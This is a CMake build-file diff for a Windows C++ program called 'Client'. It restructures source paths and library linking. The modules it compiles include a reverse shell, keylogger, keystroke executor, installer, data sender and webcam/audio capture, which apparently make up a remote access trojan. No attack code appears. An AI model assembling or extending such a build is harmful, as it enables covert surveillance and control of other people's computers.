@@ -1,28 +1,38 @@
 cmake_minimum_required(VERSION 3.22)
 project(Client)
 
-
 set(CMAKE_CXX_STANDARD 20)
 
 set(OpenCV_DIR "C:\\opencv\\mingw-build\\install")
-
 set(CMAKE_MODULE_PATH ${CMAKE_MODULE_PATH} "${CMAKE_SOURCE_DIR}/cmake/")
 
-#find_package(OpenCV REQUIRED)
-
+include_directories(${CMAKE_SOURCE_DIR}/includes)
 include_directories(${OpenCV_INCLUDE_DIRS})
 
-add_executable(Client client.cpp video_audio/DeviceEnumerator.cpp stream/Stream.cpp stream/Stream.h time/Time.cpp time/Time.h converter/Converter.cpp download/Download.cpp download/Download.h file/FileManager.cpp file/FileManager.h information/system/SystemInformation.cpp information/system/SystemInformation.h information/network/NetworkInformation.cpp information/network/NetworkInformation.h reverse_shell/ReverseShell.cpp reverse_shell/ReverseShell.h keylogger/KeyLogger.cpp keylogger/KeyLogger.h keyboard/KeyboardExecuter.cpp keyboard/KeyboardExecuter.h permission/Permission.cpp permission/Permission.h box_message/MessageBoxGUI.cpp state/SystemState.cpp state/SystemState.h install/Install.cpp install/Install.h sender/Sender.cpp
-        thread/ThreadGen.tpp
-        thread/ThreadGen.h
+add_executable(Client
+        src/client.cpp
+        src/video_audio/DeviceEnumerator.cpp
+        src/stream/Stream.cpp
+        src/time/TimeCS.cpp
+        src/converter/Converter.cpp
+        src/download/Download.cpp
+        src/file/FileManager.cpp
+        src/information/system/SystemInformation.cpp
+        src/information/network/NetworkInformation.cpp
+        src/reverse_shell/ReverseShell.cpp
+        src/keylogger/KeyLogger.cpp
+        src/keyboard/KeyboardExecuter.cpp
+        src/permission/Permission.cpp
+        src/box_message/MessageBoxGUI.cpp
+        src/state/SystemState.cpp
+        src/install/Install.cpp
+        src/sender/Sender.cpp
 )
 
-#set(OpenCV_LIBS opencv_core opencv_imgproc opencv_highgui opencv_imgcodecs)
-
-
-target_link_libraries(Client ${OpenCV_LIBS})
-target_link_libraries(Client ws2_32)
-target_link_libraries(Client wininet)
-target_link_libraries(Client stdc++fs)
-target_link_libraries(Client strmiids)
-
+target_link_libraries(Client
+        ${OpenCV_LIBS}
+        ws2_32
+        wininet
+        stdc++fs
+        strmiids
+)
